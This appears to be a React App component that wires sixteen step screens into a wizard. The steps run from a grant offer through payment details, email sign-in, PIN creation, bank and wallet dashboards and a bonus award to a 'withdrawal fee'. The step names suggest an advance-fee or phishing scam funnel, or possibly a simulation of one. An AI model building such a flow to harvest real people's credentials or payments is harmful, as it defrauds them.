import React from 'react';
import { StepperProvider, useStepper } from './context/StepperContext';
import { StepperHeader } from './components/StepperHeader';
import { CompletionModal } from './components/CompletionModal';

import { Step1_Initiative } from './components/steps/Step1_Initiative';
import { Step2_Grant } from './components/steps/Step2_Grant';
import { Step3_PaymentSelection } from './components/steps/Step3_PaymentSelection';
import { Step4_PaymentDetails } from './components/steps/Step4_PaymentDetails';
import { Step5_SecurityHandoff } from './components/steps/Step5_SecurityHandoff';
import { Step6_EmailSignIn } from './components/steps/Step6_EmailSignIn';
import { Step7_PinVerification } from './components/steps/Step7_PinVerification';
import { Step8_AccountName } from './components/steps/Step8_AccountName';
import { Step9_CreatePin } from './components/steps/Step9_CreatePin';
import { Step10_BankDashboard } from './components/steps/Step10_BankDashboard';
import { Step11_PhoneVerification } from './components/steps/Step11_PhoneVerification';
import { Step12_WalletDashboard } from './components/steps/Step12_WalletDashboard';
import { Step13_BonusAward } from './components/steps/Step13_BonusAward';
import { Step14_TransferMethod } from './components/steps/Step14_TransferMethod';
import { Step15_TransferDetails } from './components/steps/Step15_TransferDetails';
import { Step16_WithdrawalFee } from './components/steps/Step16_WithdrawalFee';

const StepContent = () => {
  const { currentStep } = useStepper();

  return (
    <main className="step-viewport-container">
      {currentStep === 1 && <Step1_Initiative />}
      {currentStep === 2 && <Step2_Grant />}
      {currentStep === 3 && <Step3_PaymentSelection />}
      {currentStep === 4 && <Step4_PaymentDetails />}
      {currentStep === 5 && <Step5_SecurityHandoff />}
      {currentStep === 6 && <Step6_EmailSignIn />}
      {currentStep === 7 && <Step7_PinVerification />}
      {currentStep === 8 && <Step8_AccountName />}
      {currentStep === 9 && <Step9_CreatePin />}
      {currentStep === 10 && <Step10_BankDashboard />}
      {currentStep === 11 && <Step11_PhoneVerification />}
      {currentStep === 12 && <Step12_WalletDashboard />}
      {currentStep === 13 && <Step13_BonusAward />}
      {currentStep === 14 && <Step14_TransferMethod />}
      {currentStep === 15 && <Step15_TransferDetails />}
      {currentStep === 16 && <Step16_WithdrawalFee />}
    </main>
  );
};

export const App = () => {
  return (
    <StepperProvider>
      <StepperHeader />
      <StepContent />
      <CompletionModal />
    </StepperProvider>
  );
};

export default App;
